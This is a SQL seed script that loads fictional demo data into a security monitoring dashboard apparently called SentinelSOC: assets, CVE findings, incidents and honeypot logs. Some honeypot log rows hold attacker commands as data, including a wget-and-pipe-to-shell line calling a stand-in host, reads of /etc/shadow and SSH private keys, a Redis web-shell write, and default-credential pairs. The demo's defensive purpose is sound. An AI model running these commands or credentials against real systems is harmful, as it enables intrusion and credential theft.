-- SentinelSOC Demo Data Seed (schema-matched)
-- Client ID: 24a4995f-6d74-46f2-914a-521d0786c615

DO $$
DECLARE
  cid  VARCHAR := '24a4995f-6d74-46f2-914a-521d0786c615';
  a1   VARCHAR := gen_random_uuid()::text;
  a2   VARCHAR := gen_random_uuid()::text;
  a3   VARCHAR := gen_random_uuid()::text;
  a4   VARCHAR := gen_random_uuid()::text;
  a5   VARCHAR := gen_random_uuid()::text;
  hp1  VARCHAR := gen_random_uuid()::text;
  hp2  VARCHAR := gen_random_uuid()::text;
BEGIN

-- ============================================================
-- ASSETS
-- ============================================================
INSERT INTO assets (id, client_id, hostname, ip_address, asset_type, status, risk_score, ports, technologies, metadata, created_at, updated_at)
VALUES
  (a1, cid, 'web-server-01',      '192.168.1.10', 'server',      'online', 85.0, '[80,443,22]', '["nginx","ubuntu","openssl"]', '{"os":"Ubuntu 22.04","criticality":"critical"}', NOW()-INTERVAL '30 days', NOW()),
  (a2, cid, 'db-server-01',       '192.168.1.20', 'server',      'online', 78.0, '[5432,3306,22]','["postgresql","mysql","ubuntu"]','{"os":"Ubuntu 20.04","criticality":"critical"}', NOW()-INTERVAL '30 days', NOW()),
  (a3, cid, 'win-workstation-01', '192.168.1.50', 'workstation', 'online', 65.0, '[445,3389,135]','["windows","rdp","smb"]',       '{"os":"Windows 11 Pro","criticality":"high"}',   NOW()-INTERVAL '20 days', NOW()),
  (a4, cid, 'firewall-01',        '192.168.1.1',  'network',     'online', 40.0, '[80,443,22]',   '["pfsense","linux"]',           '{"os":"pfSense 2.7","criticality":"critical"}',  NOW()-INTERVAL '30 days', NOW()),
  (a5, cid, 'dev-laptop-01',      '192.168.1.55', 'workstation', 'online', 55.0, '[80,443,22]',   '["windows","chrome"]',          '{"os":"Windows 11 Home","criticality":"medium"}',NOW()-INTERVAL '15 days', NOW())
ON CONFLICT DO NOTHING;

-- ============================================================
-- VULNERABILITIES
-- ============================================================
INSERT INTO vulnerabilities (id, client_id, asset_id, title, description, severity, cvss_score, cve_id, status, remediation, found_at)
VALUES
  (gen_random_uuid()::text, cid, a1, 'OpenSSL Critical RCE',           'Remote code execution via crafted TLS handshake',           'critical', 9.8, 'CVE-2024-0001', 'open',       'Update OpenSSL to 3.2.1+',                NOW()-INTERVAL '10 days'),
  (gen_random_uuid()::text, cid, a1, 'Apache Log4j Vulnerability',     'JNDI injection allowing remote code execution',             'critical',10.0, 'CVE-2021-44228','open',       'Upgrade Log4j to 2.17.0+',               NOW()-INTERVAL '5 days'),
  (gen_random_uuid()::text, cid, a2, 'PostgreSQL Privilege Escalation','Local privilege escalation via pg_signal_backend',          'high',    8.1, 'CVE-2023-2454', 'open',       'Upgrade PostgreSQL to 15.3+',             NOW()-INTERVAL '8 days'),
  (gen_random_uuid()::text, cid, a2, 'Redis No Auth Exposed',          'Redis instance accessible without authentication',          'critical', 9.1, NULL,            'open',       'Enable Redis AUTH and bind to localhost', NOW()-INTERVAL '1 day'),
  (gen_random_uuid()::text, cid, a3, 'SMB EternalBlue Exposure',       'Host vulnerable to EternalBlue exploit',                   'critical', 9.3, 'CVE-2017-0144', 'open',       'Apply MS17-010 security patch',           NOW()-INTERVAL '3 days'),
  (gen_random_uuid()::text, cid, a3, 'Outdated RDP Version',           'Remote Desktop Protocol with known vulnerabilities',        'medium',   6.5, NULL,            'open',       'Enable NLA and update Windows',           NOW()-INTERVAL '7 days'),
  (gen_random_uuid()::text, cid, a4, 'Firewall Admin Panel Exposed',   'Admin interface accessible from WAN',                      'high',     8.6, NULL,            'open',       'Restrict admin access to LAN only',      NOW()-INTERVAL '15 days'),
  (gen_random_uuid()::text, cid, a5, 'Unpatched Windows Defender',     'Antivirus definitions outdated by 30+ days',               'medium',   5.3, NULL,            'open',       'Force Windows Update',                   NOW()-INTERVAL '2 days'),
  (gen_random_uuid()::text, cid, a1, 'Nginx SSRF Vulnerability',       'Server-Side Request Forgery via misconfigured proxy',      'medium',   6.1, 'CVE-2023-44487','remediated', 'Update nginx and apply config fix',       NOW()-INTERVAL '20 days'),
  (gen_random_uuid()::text, cid, a2, 'MySQL Weak Authentication',      'Default credentials found on MySQL instance',              'high',     7.5, NULL,            'open',       'Change default credentials immediately',  NOW()-INTERVAL '12 days')
ON CONFLICT DO NOTHING;

-- ============================================================
-- INCIDENTS
-- ============================================================
INSERT INTO incidents (id, client_id, target_asset_id, title, description, severity, status, source, source_ip, mitre_technique, mitre_tactic, detected_at)
VALUES
  (gen_random_uuid()::text, cid, a1, 'SSH Brute Force Attack',          '847 failed SSH login attempts in 10 min from external IP',         'high',     'open',         'edr',     '185.220.101.45', 'T1110.001', 'Credential Access',    NOW()-INTERVAL '2 hours'),
  (gen_random_uuid()::text, cid, a2, 'SQL Injection on DB Server',      'Malicious SQL injection payload detected in HTTP requests',         'critical', 'investigating', 'waf',     '45.95.168.102',  'T1190',    'Initial Access',       NOW()-INTERVAL '4 hours'),
  (gen_random_uuid()::text, cid, a1, 'Suspicious PowerShell Execution', 'Base64-encoded PowerShell command executed on web server',         'high',     'open',         'edr',     NULL,             'T1059.001','Execution',            NOW()-INTERVAL '6 hours'),
  (gen_random_uuid()::text, cid, a3, 'Lateral Movement via SMB',        'Unusual SMB traffic detected between workstation and file server', 'critical', 'investigating', 'network', '192.168.1.50',  'T1021.002','Lateral Movement',     NOW()-INTERVAL '24 hours'),
  (gen_random_uuid()::text, cid, a2, 'Data Exfiltration Attempt',       'Large outbound data transfer to unknown external IP',              'critical', 'open',         'network', '192.168.1.20',  'T1048',    'Exfiltration',         NOW()-INTERVAL '3 hours'),
  (gen_random_uuid()::text, cid, a4, 'Port Scan from External IP',      'Systematic port scanning from known malicious IP',                 'medium',   'open',         'firewall','194.165.16.11',  'T1046',    'Discovery',            NOW()-INTERVAL '5 hours'),
  (gen_random_uuid()::text, cid, a1, 'Malware Dropper Detected',        'Trojan dropper executable found in /tmp directory',               'critical', 'open',         'edr',     NULL,             'T1105',    'Command and Control',  NOW()-INTERVAL '8 hours'),
  (gen_random_uuid()::text, cid, a3, 'Ransomware Indicators Detected',  'File encryption activity and ransom note creation detected',       'critical', 'open',         'edr',     NULL,             'T1486',    'Impact',               NOW()-INTERVAL '30 minutes'),
  (gen_random_uuid()::text, cid, a2, 'Unauthorized Database Access',    'Admin-level DB queries executed outside business hours',          'high',     'investigating', 'edr',     '10.0.0.5',      'T1078',    'Defense Evasion',      NOW()-INTERVAL '12 hours'),
  (gen_random_uuid()::text, cid, a5, 'Suspicious DNS Queries (C2)',     'DGA-pattern domain lookups — possible C2 communication',          'high',     'open',         'network', NULL,             'T1568.002','Command and Control',  NOW()-INTERVAL '48 hours'),
  (gen_random_uuid()::text, cid, a1, 'Web Shell Uploaded',              'PHP web shell detected in web root directory',                    'critical', 'open',         'edr',     '45.33.32.156',   'T1505.003','Persistence',          NOW()-INTERVAL '7 hours'),
  (gen_random_uuid()::text, cid, a4, 'Firewall Rule Modification',      'Unauthorized rule added allowing inbound traffic on port 4444',   'high',     'open',         'edr',     NULL,             'T1562.004','Defense Evasion',      NOW()-INTERVAL '9 hours'),
  (gen_random_uuid()::text, cid, a2, 'Credential Dumping Attempt',      'LSASS memory access detected — possible credential harvesting',  'critical', 'investigating', 'edr',     NULL,             'T1003.001','Credential Access',    NOW()-INTERVAL '11 hours'),
  (gen_random_uuid()::text, cid, a3, 'Phishing Link Clicked',           'User clicked suspicious link leading to known phishing domain',   'medium',   'open',         'email',   '192.168.1.50',  'T1566.001','Initial Access',       NOW()-INTERVAL '36 hours'),
  (gen_random_uuid()::text, cid, a1, 'C2 Beacon Detected',              'Periodic HTTP callbacks to known C2 IP with Cobalt Strike sig',  'critical', 'open',         'network', '104.21.14.90',   'T1071.001','Command and Control',  NOW()-INTERVAL '15 hours')
ON CONFLICT DO NOTHING;

-- ============================================================
-- HONEYPOTS + INTERACTIONS
-- ============================================================
INSERT INTO honeypots (id, client_id, name, honeypot_type, config, status, ip_address, port, interactions_count, created_at)
VALUES
  (hp1, cid, 'SSH Honeypot',  'ssh',  '{"banner":"OpenSSH_8.2p1"}', 'active', '0.0.0.0', 2222, 15, NOW()-INTERVAL '30 days'),
  (hp2, cid, 'HTTP Honeypot', 'http', '{"banner":"Apache/2.4.41"}', 'active', '0.0.0.0', 8888, 10, NOW()-INTERVAL '30 days')
ON CONFLICT DO NOTHING;

INSERT INTO honeypot_interactions (id, honeypot_id, client_id, source_ip, source_port, protocol, commands, credentials_tried, payloads, raw_log, timestamp)
VALUES
  (gen_random_uuid()::text, hp1, cid, '185.220.101.45', 54312, 'tcp', '["ls -la","cat /etc/passwd","whoami"]','[{"u":"root","p":"toor"},{"u":"root","p":"123456"}]','[]','SSH brute force session', NOW()-INTERVAL '1 hour'),
  (gen_random_uuid()::text, hp1, cid, '45.95.168.102',  61234, 'tcp', '["id","uname -a"]',                   '[{"u":"admin","p":"admin"},{"u":"root","p":"password"}]','[]','SSH scanner hit', NOW()-INTERVAL '2 hours'),
  (gen_random_uuid()::text, hp2, cid, '194.165.16.11',  43210, 'tcp', '["GET /admin/config.php"]',            '[]','[{"data":"GET /admin/config.php HTTP/1.1"}]','Web crawler hit admin path', NOW()-INTERVAL '3 hours'),
  (gen_random_uuid()::text, hp1, cid, '89.248.167.131', 55100, 'tcp', '["ls","cat /etc/shadow"]',            '[{"u":"ubuntu","p":"ubuntu"}]','[]','EternalBlue scanner', NOW()-INTERVAL '4 hours'),
  (gen_random_uuid()::text, hp1, cid, '45.33.32.156',   49999, 'tcp', '["id","wget http://evil.sh -O-|sh"]', '[{"u":"pi","p":"raspberry"}]','[{"data":"dropper payload"}]','IoT bot attempt', NOW()-INTERVAL '5 hours'),
  (gen_random_uuid()::text, hp2, cid, '104.21.14.90',   32100, 'tcp', '["POST /api/execute"]',               '[]','[{"cmd":"whoami"},{"cmd":"cat /etc/passwd"}]','RCE probe on HTTP honeypot', NOW()-INTERVAL '6 hours'),
  (gen_random_uuid()::text, hp1, cid, '185.220.101.45', 54800, 'tcp', '["ls /root","cat ~/.ssh/id_rsa"]',    '[{"u":"root","p":"Password1"},{"u":"root","p":"admin123"}]','[]','Credential spray', NOW()-INTERVAL '7 hours'),
  (gen_random_uuid()::text, hp2, cid, '196.251.73.4',   41234, 'tcp', '["GET /.env","GET /wp-config.php"]',  '[]','[{"data":"credential harvesting attempt"}]','Config file harvester', NOW()-INTERVAL '8 hours'),
  (gen_random_uuid()::text, hp1, cid, '45.95.168.102',  60001, 'tcp', '["cat /etc/redis.conf"]',             '[{"u":"redis","p":"redis"}]','[]','Redis recon via SSH', NOW()-INTERVAL '9 hours'),
  (gen_random_uuid()::text, hp2, cid, '89.248.167.131', 39200, 'tcp', '["GET /_cat/indices"]',               '[]','[{"data":"Elasticsearch dump attempt"}]','Elastic unauth query', NOW()-INTERVAL '10 hours'),
  (gen_random_uuid()::text, hp1, cid, '176.111.174.26', 55555, 'tcp', '["ls","ps aux","netstat -an"]',       '[{"u":"root","p":"root"},{"u":"admin","p":"admin"}]','[]','Common password spray', NOW()-INTERVAL '11 hours'),
  (gen_random_uuid()::text, hp2, cid, '194.165.16.11',  33890, 'tcp', '["GET /phpmyadmin/"]',                '[]','[{"data":"phpMyAdmin scan"}]','RDP fingerprinting', NOW()-INTERVAL '12 hours'),
  (gen_random_uuid()::text, hp1, cid, '45.33.32.156',   48080, 'tcp', '["cat /etc/passwd","id","hostname"]', '[{"u":"deploy","p":"deploy123"}]','[]','Credential harvesting', NOW()-INTERVAL '13 hours'),
  (gen_random_uuid()::text, hp2, cid, '104.21.14.90',   22222, 'tcp', '["GET /manager/html"]',               '[]','[{"data":"Tomcat manager probe"}]','Tomcat admin scan', NOW()-INTERVAL '14 hours'),
  (gen_random_uuid()::text, hp1, cid, '196.251.73.4',   56789, 'tcp', '["cat /etc/group"]',                  '[{"u":"postgres","p":"postgres"},{"u":"sa","p":"sa"}]','[]','DB credential probe', NOW()-INTERVAL '15 hours'),
  (gen_random_uuid()::text, hp2, cid, '89.248.167.131', 42375, 'tcp', '["GET /v1.41/containers/json"]',      '[]','[{"data":"Docker API probe"}]','Docker daemon exposure', NOW()-INTERVAL '16 hours'),
  (gen_random_uuid()::text, hp1, cid, '45.95.168.102',  60022, 'tcp', '["uname -a","cat /etc/os-release"]',  '[{"u":"root","p":"toor"},{"u":"root","p":"1234"}]','[]','OS fingerprinting', NOW()-INTERVAL '17 hours'),
  (gen_random_uuid()::text, hp2, cid, '185.220.101.45', 48443, 'tcp', '["POST /cgi-bin/admin.cgi"]',         '[]','[{"data":"CGI exploit payload"}]','CGI RCE exploit attempt', NOW()-INTERVAL '18 hours'),
  (gen_random_uuid()::text, hp1, cid, '176.111.174.26', 54306, 'tcp', '["show databases"]',                  '[{"u":"root","p":"mysql"},{"u":"root","p":""}]','[]','MySQL brute force via SSH', NOW()-INTERVAL '19 hours'),
  (gen_random_uuid()::text, hp2, cid, '194.165.16.11',  45432, 'tcp', '["GET /pgsql/"]',                     '[]','[{"data":"PostgreSQL web UI probe"}]','Postgres admin scan', NOW()-INTERVAL '20 hours'),
  (gen_random_uuid()::text, hp1, cid, '45.33.32.156',   56379, 'tcp', '["CONFIG SET dir /tmp","CONFIG SET dbfilename shell.php"]','[{"u":"","p":""}]','[{"data":"Redis RCE payload"}]','Redis RCE attempt', NOW()-INTERVAL '21 hours'),
  (gen_random_uuid()::text, hp2, cid, '104.21.14.90',   40445, 'tcp', '["GET /ms17-010"]',                   '[]','[{"data":"WannaCry SMB probe"}]','WannaCry signature hit', NOW()-INTERVAL '22 hours'),
  (gen_random_uuid()::text, hp1, cid, '196.251.73.4',   50023, 'tcp', '["sh","enable","shell"]',             '[{"u":"admin","p":"admin"},{"u":"admin","p":"1234"}]','[]','Mirai botnet default creds', NOW()-INTERVAL '23 hours'),
  (gen_random_uuid()::text, hp2, cid, '89.248.167.131', 48000, 'tcp', '["GET /etc/passwd"]',                 '[]','[{"data":"LFI /etc/passwd attempt"}]','LFI exploit probe', NOW()-INTERVAL '24 hours'),
  (gen_random_uuid()::text, hp1, cid, '176.111.174.26', 58080, 'tcp', '["cmd.exe /c whoami"]',               '[{"u":"tomcat","p":"tomcat"}]','[{"data":"Struts2 RCE payload"}]','Apache Struts RCE probe', NOW()-INTERVAL '25 hours')
ON CONFLICT DO NOTHING;

-- Update honeypot interaction counts
UPDATE honeypots SET interactions_count = (
  SELECT COUNT(*) FROM honeypot_interactions hi WHERE hi.honeypot_id = honeypots.id
) WHERE client_id = cid;

RAISE NOTICE 'Demo data seeded successfully!';
END $$;
